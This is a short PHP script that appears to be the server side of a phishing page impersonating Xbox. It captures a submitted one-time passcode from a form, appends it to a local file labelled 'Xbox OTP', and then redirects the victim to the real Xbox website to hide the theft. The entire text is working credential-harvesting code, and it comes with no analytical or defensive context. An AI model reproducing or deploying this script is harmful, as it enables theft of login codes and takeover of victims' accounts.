<?php
file_put_contents("otp.txt", "Xbox OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.xbox.com/en-IN/');
?>
